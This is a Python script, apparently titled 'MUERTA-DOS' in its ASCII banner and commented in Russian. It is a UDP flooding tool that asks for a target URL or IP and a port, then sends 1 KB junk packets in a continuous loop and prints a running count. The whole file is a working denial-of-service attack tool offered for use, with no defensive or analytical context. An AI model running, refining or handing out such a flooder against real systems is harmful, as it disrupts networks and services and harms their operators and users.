import socket
import threading
import time
import signal
import sys
import re

# ASCII баннер
banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠖⠚⠉⠉⠉⠀⠀⠀⠈⠉⠉⠓⠶⣤⠤⣄⡀
⠀⠀⠀⠀⠀⢀⠔⡪⠥⠶⠬⢍⣑⠲⢶⡶⡤⠤⠶⣄⣀⡀⠀⢠⠇⢀⢈⡇
⠀⠀⠀⢀⢞⣡⠎⣴⡶⠖⢤⣀⠀⠨⣠⡁⠘⢄⠀⠀⠀⠉⠙⢯⣤⣶⡿⠀
⠀⠀⠔⡡⠛⢹⢰⡓⠀⠀⠀⠙⣷⣤⡈⠳⡀⠀⠡⡀⠀⠀⢀⠂⢨⡿⠁⠀
⠀⡨⠊⠀⠀⢸⢸⣇⠀⠀⢀⡞⢉⣤⡌⢦⠈⢄⠀⢻⣄⠀⡌⢠⡾⠁⠀⠀
⠈⠀⠀⠀⠀⠀⢸⠋⣉⣑⣿⠴⠿⠼⠧⣻⢣⠀⡆⠀⣹⡖⢀⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡐⣿⠿⠏⣸⡷⠄⠒⣪⡇⣾⡇⣧⢨⣸⠁⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣷⢻⣷⣦⡤⠤⣴⣪⡿⢁⣿⣷⠏⣼⠃⣼⣿⣤⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⢧⡻⣿⡛⡿⠟⢿⢡⡿⡣⠇⠀⠏⢠⣿⡏⢣⠈⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢿⣮⣽⢵⣿⣶⡟⡴⠀⡄⡐⢠⡿⠛⠀⠀⠁⡀⠈⢣
⠀⠀⠀⠀⠀⠀⣠⠖⢹⢻⣯⡷⣝⢻⢰⡇⢀⡷⠁⣿⢁⠀⡄⠘⡀⢡⠀⣸
⠀⠀⠀⠀⢠⡞⠁⠀⢸⠘⢱⡷⠻⢣⣾⡇⢨⠁⣼⣣⢸⠀⣹⠀⣇⢸⣷⡟
⠀⠀⠀⠀⡟⢁⢀⢄⠔⠚⡙⢀⡞⠍⢊⢡⣦⣾⢷⣿⣾⣶⢿⣧⡟⣾⡟⢷
⠀⠀⠀⠀⡃⣼⠜⡏⢀⠀⠀⣼⣀⢘⣶⠻⣍⣿⣿⣿⠹⣿⠘⣿⡧⢹⡇⡄
⠀⠀⠀⢐⡳⠩⢰⠀⣾⣠⣶⢿⣿⠙⢆⢣⡘⡧⣿⠏⡆⢿⠘⣿⠀⠆⠀⠀
⠀⠀⠀⠸⢧⡧⣼⣶⡏⠟⢿⢉⡿⣷⣔⠗⠋⠀⠙⠀⠀⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠈⠈⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

███╗░░░███╗██╗░░░██╗███████╗██████╗░████████╗░█████╗░░░░░░░██████╗░░█████╗░░██████╗
████╗░████║██║░░░██║██╔════╝██╔══██╗╚══██╔══╝██╔══██╗░░░░░░██╔══██╗██╔══██╗██╔════╝
██╔████╔██║██║░░░██║█████╗░░██████╔╝░░░██║░░░███████║█████╗██║░░██║██║░░██║╚█████╗░
██║╚██╔╝██║██║░░░██║██╔══╝░░██╔══██╗░░░██║░░░██╔══██║╚════╝██║░░██║██║░░██║░╚═══██╗
██║░╚═╝░██║╚██████╔╝███████╗██║░░██║░░░██║░░░██║░░██║░░░░░░██████╔╝╚█████╔╝██████╔╝
╚═╝░░░░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═════╝░░╚════╝░╚═════╝░

1. Target
2. Open port

"""
print(banner)

# Цвета для терминала (здесь убраны, чтобы код работал в Termux)
RED = ""
RESET = ""

# Флаг для остановки потока
stop_event = threading.Event()

# Функция для обработки SIGINT (Control + C)
def signal_handler(sig, frame):
    print("\nОстановка отправки пакетов...")
    stop_event.set()  # Устанавливаем флаг остановки
    sys.exit(0)

# Функция для отправки пакетов
def send_packets(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    # Создаем большой пакет данных (1 КБ)
    large_packet = b'A' * 1024  # 1 КБ
    packet_count = 0  # Счетчик отправленных пакетов

    while not stop_event.is_set():
        try:
            sock.sendto(large_packet, (target_ip, target_port))
            packet_count += 1
            print(f"{RED}Пакет отправлен на {target_ip}:{target_port} (Отправлено пакетов: {packet_count}){RESET}")
            time.sleep(0.01)  # Задержка 10 миллисекунд между отправками
        except socket.error as e:
            print(f"Ошибка: {e}")
            print("Сервер может блокировать запросы. Ожидание перед повторной попыткой...")
            time.sleep(2)  # Задержка перед повторной попыткой

# Основная функция
def main():
    signal.signal(signal.SIGINT, signal_handler)  # Установка обработчика сигнала для остановки

    target = input("Введите URL или IP адрес: ")
    port = int(input("Введите открытый порт: "))

    # Регулярное выражение для проверки URL или IP
    url_pattern = re.compile(r"^(https?://)?((\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9.-]+)(:\d+)?(/.*)?$")
    match = url_pattern.match(target)

    if not match:
        print("Неверный формат URL или IP. Проверьте правильность ввода.")
        return

    # Извлекаем домен или IP
    if match.group(2):
        target_ip = match.group(2)
    else:
        target_ip = target

    print(f"Целевой IP/домен: {target_ip}")

    # Запуск потока для отправки пакетов
    packet_thread = threading.Thread(target=send_packets, args=(target_ip, port))
    packet_thread.start()
    packet_thread.join()

if __name__ == "__main__":
    main()
